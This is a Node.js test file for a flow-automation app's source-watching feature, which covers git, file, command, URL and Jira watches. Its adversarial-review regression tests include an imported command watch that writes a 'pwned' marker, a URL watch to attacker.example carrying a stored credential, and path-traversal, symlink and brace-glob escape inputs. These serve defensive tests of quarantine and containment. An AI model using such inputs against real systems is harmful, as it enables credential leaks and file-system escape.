// Spec 10 · 🔔 Novedades: a step declares the sources its work depends on (git branch, files, command, URL, Jira,
// Confluence, "its tools"); a check compares with the last snapshot and says what changed. The app does the diff;
// AI checks only list items with read-only tools. News accumulate until "Visto"; on change it can run the step, run
// from the step, or run the flow.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { startServer, role, cmd, sleep } from './helpers/harness.mjs';

let s;
before(async () => { s = await startServer({ name: 'watch' }); await s.start(); });
after(async () => { await s?.stop(); });
const check = (id, body = {}) => s.uiOk('POST', `/api/flows/${id}/watch/check`, body);
const until = async (fn, ms = 10000) => { const t0 = Date.now(); for (;;) { const v = await fn(); if (v) return v; if (Date.now() - t0 > ms) return v; await sleep(120); } };

test('rama git: la primera vez es la referencia; un commit nuevo es novedad con su mensaje; se acumula hasta "Visto"; aviso en 🔔', async () => {
  const repo = path.join(s.dirs.work, `wrepo-${Date.now()}`);
  fs.mkdirSync(repo, { recursive: true });
  const git = (...a) => execFileSync('git', ['-C', repo, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' });
  git('init', '-q', '-b', 'main'); fs.writeFileSync(path.join(repo, 'a.txt'), '1'); git('add', '.'); git('commit', '-qm', 'base');
  const st = role('Automatizar', 'x', { id: 's_wg', watches: [{ id: 'w_git', type: 'git', target: '{{vars.repo}}', options: { branch: 'main' } }, { id: 'w_bad', type: 'nope', target: 'x' }] });
  const f = await s.flow('Vigila git', [st], [], { vars: { repo } });
  const g = await s.getFlow(f.id);
  assert.deepEqual(g.steps[0].watches, [{ id: 'w_git', type: 'git', target: '{{vars.repo}}', options: { branch: 'main' }, onChange: 'notify' }], 'saneado: el tipo inválido se descarta');
  let r = await check(f.id);
  assert.equal(r.results[0].state, 'first', r.results[0].error);
  r = await check(f.id);
  assert.equal(r.results[0].state, 'same');
  fs.writeFileSync(path.join(repo, 'a.txt'), '2'); git('commit', '-qam', 'SBK-1 arregla el texto');
  r = await check(f.id);
  assert.equal(r.results[0].state, 'new');
  assert.match(r.results[0].changes[0].text, /main: 1 commit\(s\) nuevo\(s\) — \w+ SBK-1 arregla el texto/);
  fs.writeFileSync(path.join(repo, 'a.txt'), '3'); git('commit', '-qam', 'segundo');
  await check(f.id);
  let v = await s.uiOk('GET', `/api/flows/${f.id}/watch`);
  assert.equal(v.w_git.pending.length, 2, 'las novedades se acumulan');
  assert.equal(v.w_git.snapshot, undefined, 'la vista no expone la foto completa');
  const att = await until(async () => (await s.uiOk('GET', '/api/attention')).items.find((x) => x.kind === 'news' && x.flowId === f.id && /2 novedades/.test(x.title)));
  assert.ok(att, s.output.slice(-3000));
  assert.match(att.title, /2 novedades/);
  assert.deepEqual(att.target, { flowId: f.id, stepId: 's_wg', open: 'watch' });
  v = await s.uiOk('POST', `/api/flows/${f.id}/watch/ack`, { stepId: 's_wg' });
  assert.equal(v.w_git.pending.length, 0);
  assert.ok(await until(async () => !(await s.uiOk('GET', '/api/attention')).items.some((x) => x.kind === 'news' && x.flowId === f.id)), 'el aviso se va con "Visto"');
});

test('archivos y comando: agregados, cambiados y quitados elemento por elemento; un error se informa sin perder la foto', async () => {
  const dir = path.join(s.dirs.work, `wfiles-${Date.now()}`);
  fs.mkdirSync(path.join(dir, 'reports'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'reports', 'a.xml'), '<a/>'); fs.writeFileSync(path.join(dir, 'reports', 'b.xml'), '<b/>');
  fs.writeFileSync(path.join(dir, 'items.json'), JSON.stringify([{ id: 'T1', version: 1, title: 'uno' }, { id: 'T2', version: 1, title: 'dos' }]));
  const st = cmd('Reportes', 'Write-Output x', { id: 's_wf', watches: [
    { id: 'w_f', type: 'file', target: 'reports/*.xml' },
    { id: 'w_c', type: 'command', target: 'Get-Content items.json -Raw' },
  ] });
  const f = await s.flow('Vigila archivos', [st], [], { cwd: dir });
  await check(f.id);
  fs.writeFileSync(path.join(dir, 'reports', 'a.xml'), '<a>cambió</a>'); fs.rmSync(path.join(dir, 'reports', 'b.xml')); fs.writeFileSync(path.join(dir, 'reports', 'c.xml'), '<c/>');
  fs.writeFileSync(path.join(dir, 'items.json'), JSON.stringify([{ id: 'T1', version: 2, title: 'uno' }, { id: 'T3', version: 1, title: 'tres' }]));
  const r = await check(f.id);
  const by = (id) => r.results.find((x) => x.watchId === id);
  assert.deepEqual(by('w_f').changes.map((c) => c.kind).sort(), ['added', 'changed', 'removed']);
  assert.ok(by('w_f').changes.some((c) => c.kind === 'added' && /c\.xml/.test(c.id)));
  assert.deepEqual(by('w_c').changes.map((c) => `${c.kind}:${c.id}`).sort(), ['added:T3', 'changed:T1', 'removed:T2']);
  // a command that fails: error, and the previous snapshot is kept (the next good check compares against it)
  const g = await s.getFlow(f.id);
  g.steps[0].watches[1].target = 'Get-Content no-existe.json -ErrorAction Stop';
  await s.uiOk('PUT', `/api/flows/${f.id}`, g);
  const r2 = await check(f.id, { stepId: 's_wf' });
  const bad = r2.results.find((x) => x.watchId === 'w_c');
  assert.equal(bad.state, 'error');
  assert.match(bad.error, /código 1/);
});

test('Jira con Haiku de solo lectura: la app (no el modelo) dice el cambio de estado y los comentarios nuevos', async () => {
  const items = (status, comments) => JSON.stringify({ items: [{ id: 'SBK-1', version: `2026-11-18T10:00|${status}|${comments}`, title: 'Line History' }] });
  const ans = path.join(s.dirs.work, `jira-${Date.now()}.json`).replace(/\\/g, '/');
  fs.writeFileSync(ans, items('In Progress', 3));
  const st = role('Analizar', 'x', { id: 's_wj', watches: [{ id: 'w_j', type: 'jira', target: `SBK-1 [[mock:say-file ${ans}]]` }] });
  const f = await s.flow('Vigila Jira', [st], []);
  const n0 = s.calls().length;
  assert.equal((await check(f.id)).results[0].state, 'first');
  const call = s.callsSince(n0)[0];
  assert.match(call.system, /Solo LEES: nunca crees, edites, comentes ni transiciones/);
  assert.match(s.argOf(call, '--allowedTools'), /getJiraIssue/);
  assert.doesNotMatch(s.argOf(call, '--allowedTools'), /editJiraIssue|addComment|transition|createJira/i);
  assert.match(s.argOf(call, '--disallowedTools'), /Edit,Write.*Bash/);
  assert.equal(s.argOf(call, '--model'), 'haiku');
  fs.writeFileSync(ans, items('Ready For Testing', 5));
  const r = await check(f.id);
  assert.equal(r.results[0].state, 'new');
  assert.equal(r.results[0].changes[0].text, 'SBK-1 (Line History): estado In Progress → Ready For Testing; 2 comentario(s) nuevo(s)');
});

test('al cambiar: "ejecutar desde este step" corre ese step y lo que sigue (no lo anterior) con el resumen como entrada; API externa /status', async () => {
  const dir = path.join(s.dirs.work, `wrun-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'build.txt'), 'v1');
  const a = role('Pull', '[[mock:say tickets]]', { id: 's_ra' });
  const b = role('Automatizar', '[[mock:echo]]', { id: 's_rb', watches: [{ id: 'w_r', type: 'file', target: 'build.txt', onChange: 'run_from_step' }] });
  const c = role('Cierre', '[[mock:say cerrado]]', { id: 's_rc' });
  const f = await s.flow('Vigila y corre', [a, b, c], [['s_ra', 's_rb'], ['s_rb', 's_rc']], { cwd: dir });
  // the first run gives Pull a last output (the "from" run reuses it)
  const { runId: r0 } = await s.uiOk('POST', `/api/flows/${f.id}/run`, { input: '', breakpoints: false }); await s.waitRun(f.id, r0);
  let ex = await s.ext('POST', `/flows/${encodeURIComponent('Vigila y corre')}/status`, { step: 'Automatizar' });
  assert.equal(ex.status, 200);
  assert.equal(ex.body.results[0].state, 'first');
  assert.deepEqual(ex.body.actions, []);
  fs.writeFileSync(path.join(dir, 'build.txt'), 'v2');
  ex = await s.ext('POST', `/flows/${f.id}/status`, {});
  assert.equal(ex.body.results[0].state, 'new');
  const act = ex.body.actions[0];
  assert.equal(act.kind, 'run_from_step');
  assert.ok(act.runId, JSON.stringify(act));
  const run = await s.waitRun(f.id, act.runId);
  assert.equal(run.trigger, 'source');
  assert.equal(run.from, 's_rb');
  assert.equal(run.steps.s_ra, undefined, 'lo anterior no se vuelve a ejecutar');
  assert.equal(run.steps.s_rb.status, 'success');
  assert.equal(run.steps.s_rc.status, 'success');
  assert.match(run.input, /Novedades en las fuentes de «Automatizar»[\s\S]*build\.txt: cambió/);
  assert.match(run.steps.s_rb.output, /tickets/, 'recibe la última salida de Pull');
  const v = await s.uiOk('GET', `/api/flows/${f.id}/watch`);
  assert.equal(v.w_r.action.runId, act.runId);
  // unknown step → 404
  assert.equal((await s.ext('POST', `/flows/${f.id}/status?step=Nada`, {})).status, 404);
});

test('URL: ETag/Last-Modified y, sin ellos, el contenido; HTTP de error se informa; polling saneado (mínimo 5 min)', async () => {
  let etag = '"v1"'; let body = 'uno';
  const srv = http.createServer((req, res) => {
    if (req.url === '/etag') { res.writeHead(200, { ETag: etag }); return res.end(req.method === 'HEAD' ? undefined : 'x'); }
    if (req.url === '/plain') { res.writeHead(200, { 'Content-Type': 'text/plain' }); return res.end(req.method === 'HEAD' ? undefined : body); }
    res.writeHead(404); res.end();
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    const st = role('Artefactos', 'x', { id: 's_wu', watches: [{ id: 'w_e', type: 'url', target: `${base}/etag` }, { id: 'w_p', type: 'url', target: `${base}/plain` }, { id: 'w_404', type: 'url', target: `${base}/no` }] });
    const f = await s.flow('Vigila URL', [st], []);
    let r = await check(f.id);
    assert.equal(r.results.find((x) => x.watchId === 'w_404').state, 'error');
    assert.match(r.results.find((x) => x.watchId === 'w_404').error, /HTTP 404/);
    etag = '"v2"'; body = 'dos';
    r = await check(f.id);
    assert.equal(r.results.find((x) => x.watchId === 'w_e').state, 'new');
    assert.equal(r.results.find((x) => x.watchId === 'w_p').state, 'new', 'sin ETag compara el contenido');
    const g = await s.getFlow(f.id); g.watchPolling = { enabled: true, everyMinutes: 1 }; await s.uiOk('PUT', `/api/flows/${f.id}`, g);
    assert.deepEqual((await s.getFlow(f.id)).watchPolling, { enabled: true, everyMinutes: 5 });
  } finally { srv.close(); }
});

test('UI: agregar una fuente, comprobar, ver la novedad en el nodo (🔔 1) y marcarla vista', async (t) => {
  const { openUi } = await import('./helpers/browser.mjs');
  const ui = await openUi('watch-ui');
  try {
    if (ui.skipReason) { t.skip(ui.skipReason); return; }
    const { s: u, page } = ui;
    const dir = path.join(u.dirs.work, `wui-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'notas.txt'), 'a');
    const f = await u.flow('Vigila UI', [role('Paso', 'x', { id: 's_wui', position: { x: 120, y: 120 } })], [], { cwd: dir });
    await page.goto(`${u.base}/?flow=${f.id}`);
    const nodeLoc = page.locator('.react-flow__node', { has: page.locator('.node-name', { hasText: 'Paso' }) });
    await nodeLoc.click();
    const box = page.getByTestId('watch-box');
    await box.getByTestId('watch-add').selectOption('file');
    await box.getByTestId('watch-target').fill('notas.txt');
    await box.getByTestId('watch-check').click();
    await box.getByTestId('watch-state').getByText(/primera foto/).waitFor();
    fs.writeFileSync(path.join(dir, 'notas.txt'), 'b');
    await page.getByTestId('watch-all').click();
    await nodeLoc.getByTestId('news-badge').getByText('🔔 1').waitFor();
    await box.getByText('notas.txt: cambió').waitFor();
    await box.getByTestId('watch-ack').click();
    await nodeLoc.getByTestId('news-badge').waitFor({ state: 'detached' });
    assert.equal((await u.getFlow(f.id)).steps[0].watches[0].type, 'file');
  } finally { await ui.close?.(); }
});

// ---- regressions of the architect + adversarial reviews (2026-11-18) ----
test('revisión: importar una fuente "comando" o una URL con credencial pone el flujo en cuarentena, y en cuarentena no se comprueba nada', async () => {
  const marker = path.join(s.dirs.work, `pwned-${Date.now()}.txt`);
  const st = role('Paso', 'x', { id: 's_q', watches: [{ id: 'w_c', type: 'command', target: `Set-Content -Path '${marker}' -Value x` }, { id: 'w_u', type: 'url', target: 'https://attacker.example/x', options: { credential: 'jira' } }, { id: 'w_c', type: 'file', target: 'a.txt' }] });
  const f = await s.flow('Para exportar', [st], []);
  const bundle = await s.uiOk('GET', `/api/flows/${f.id}/export`);
  const { flow: g } = await s.uiOk('POST', '/api/flows/import', { bundle });
  assert.ok(g.quarantine, 'en cuarentena');
  assert.ok(g.quarantine.reasons.some((r) => /fuente vigilada con comando/.test(r)), JSON.stringify(g.quarantine.reasons));
  assert.ok(g.quarantine.reasons.some((r) => /usa la credencial «jira»/.test(r)));
  assert.equal(new Set(g.steps[0].watches.map((w) => w.id)).size, 3, 'ids únicos al importar (saneado)');
  const r = await s.ui('POST', `/api/flows/${g.id}/watch/check`, {});
  assert.equal(r.status, 423);
  assert.equal((await s.ext('POST', `/flows/${g.id}/status`, {})).status, 423);
  assert.ok(!fs.existsSync(marker), 'el comando no corrió');
});

test('revisión: una credencial solo viaja a su propio sitio; el secreto de un comando no se guarda ni se muestra', async () => {
  let got = null;
  const srv = http.createServer((req, res) => { got = req.headers.authorization || null; res.writeHead(200, { ETag: '"a"' }); res.end(); });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${srv.address().port}`;
  try {
    await s.uiOk('POST', '/api/credentials', { type: 'jenkins', name: 'ci', fields: { url: base, user: 'qa', token: 'TOKEN-JENKINS-1' } });
    await s.uiOk('POST', '/api/credentials', { type: 'generic', name: 'k', fields: { value: 'TOPSECRET42' } });
    const dir = path.join(s.dirs.work, `wsec-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
    const st = cmd('Paso', 'Write-Output x', { id: 's_sec', watches: [
      { id: 'w_ok', type: 'url', target: `${base}/job/x`, options: { credential: 'ci' } },
      { id: 'w_other', type: 'url', target: 'http://127.0.0.2:9/x', options: { credential: 'ci' } },
      { id: 'w_cmd', type: 'command', target: 'Write-Output "token={{cred.k.value}}"' },
      { id: 'w_out', type: 'file', target: '../../secreto.txt' },
    ] });
    const f = await s.flow('Credenciales', [st], [], { cwd: dir });
    const r = await check(f.id);
    const by = (id) => r.results.find((x) => x.watchId === id);
    assert.equal(by('w_ok').state, 'first', by('w_ok').error);
    assert.match(got, /^Basic /, 'a su propio sitio sí');
    assert.equal(by('w_other').state, 'error');
    assert.match(by('w_other').error, /no se envía a http:\/\/127\.0\.0\.2:9/);
    assert.equal(by('w_out').state, 'error');
    assert.match(by('w_out').error, /dentro de la carpeta del flujo/);
    const stored = fs.readFileSync(s.flowFile(f.id, 'sources.json'), 'utf8');
    assert.ok(!stored.includes('TOPSECRET42'), 'el secreto no queda en el estado');
    assert.match(stored, /token=/);
  } finally { srv.close(); }
});

test('revisión: una ejecución lanzada por novedades tiene los controles de una externa (plantilla cruda rechazada) y la novedad llega como datos externos', async () => {
  const dir = path.join(s.dirs.work, `wguard-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'b.txt'), '1');
  const raw = cmd('Crudo', 'Write-Output {{{input}}}', { id: 's_raw', watches: [{ id: 'w_g', type: 'file', target: 'b.txt', onChange: 'run_step' }] });
  const f = await s.flow('Guardas', [raw], [], { cwd: dir });
  await check(f.id);
  fs.writeFileSync(path.join(dir, 'b.txt'), '2');
  const r = await check(f.id);
  assert.equal(r.actions[0].runId, undefined);
  assert.match(r.actions[0].error, /No se ejecutó: .*\{\{\{input\}\}\}/);
  // a safe step: the run gets the news wrapped as untrusted data
  const g = await s.getFlow(f.id); g.steps[0].command = 'Write-Output {{input}}'; await s.uiOk('PUT', `/api/flows/${f.id}`, g);
  fs.writeFileSync(path.join(dir, 'b.txt'), '3');
  const r2 = await check(f.id);
  assert.ok(r2.actions[0].runId, JSON.stringify(r2.actions));
  const run = await s.waitRun(f.id, r2.actions[0].runId);
  assert.match(run.input, /<untrusted-data>[\s\S]*b\.txt: cambió[\s\S]*<\/untrusted-data>/);
});

test('revisión: steps duplicados no comparten el estado de sus fuentes; cambiar {{vars.x}} es una referencia nueva', async () => {
  const dir = path.join(s.dirs.work, `wdup-${Date.now()}`); fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'a.txt'), 'a'); fs.writeFileSync(path.join(dir, 'b.txt'), 'b');
  const w = { id: 'w_same', type: 'file', target: '{{vars.f}}' };
  const f = await s.flow('Duplicados', [role('A', 'x', { id: 's_da', watches: [w] }), role('B', 'x', { id: 's_db', watches: [{ ...w }] })], [], { cwd: dir, vars: { f: 'a.txt' } });
  const g = await s.getFlow(f.id);
  assert.notEqual(g.steps[0].watches[0].id, g.steps[1].watches[0].id, 'el id repetido se renueva al guardar');
  await check(f.id);
  assert.ok((await check(f.id)).results.every((x) => x.state === 'same'), 'sin diffs falsos entre los dos');
  g.vars.f = 'b.txt'; await s.uiOk('PUT', `/api/flows/${f.id}`, g);
  assert.ok((await check(f.id)).results.every((x) => x.state === 'first'), 'otro archivo: nueva referencia, no un "cambio"');
});

test('revisión 2: un secreto con comillas o barras tampoco queda en el estado (salida JSON); un enlace dentro de la carpeta no saca la vigilancia afuera', async () => {
  await s.uiOk('POST', '/api/credentials', { type: 'generic', name: 'k2', fields: { value: 'TOP"SECRET\\42' } });
  const dir = path.join(s.dirs.work, `wsec2-${Date.now()}`); fs.mkdirSync(path.join(dir, 'in'), { recursive: true });
  const outside = path.join(s.dirs.work, `fuera-${Date.now()}`); fs.mkdirSync(outside, { recursive: true }); fs.writeFileSync(path.join(outside, 'secreto.txt'), 'x');
  fs.symlinkSync(outside, path.join(dir, 'in', 'enlace'), 'junction');
  const st = cmd('Paso', 'Write-Output x', { id: 's_sec2', watches: [
    { id: 'w_json', type: 'command', target: '"[" + (@{ id = "T1"; title = {{cred.k2.value}} } | ConvertTo-Json -Compress) + "]"' },
    { id: 'w_link', type: 'file', target: 'in/**/*.txt' },
    { id: 'w_direct', type: 'file', target: 'in/enlace/secreto.txt' },
    { id: 'w_brace', type: 'file', target: '{..,in}/**/*.txt' },
  ] });
  const f = await s.flow('Secretos 2', [st], [], { cwd: dir });
  const r = await check(f.id);
  const by = (id) => r.results.find((x) => x.watchId === id);
  assert.equal(by('w_json').state, 'first', by('w_json').error);
  const stored = fs.readFileSync(s.flowFile(f.id, 'sources.json'), 'utf8');
  assert.ok(!stored.includes('SECRET'), stored.slice(0, 400));
  for (const id of ['w_link', 'w_direct']) assert.ok(by(id).state === 'error' || by(id).count === 0, JSON.stringify(by(id)));
  const st8 = JSON.parse(stored);
  for (const id of ['w_link', 'w_direct']) assert.deepEqual(Object.keys(st8[id]?.snapshot || {}), [], 'el archivo de afuera (vía enlace) no se vigila');
  assert.equal(by('w_brace').state, 'error');
});
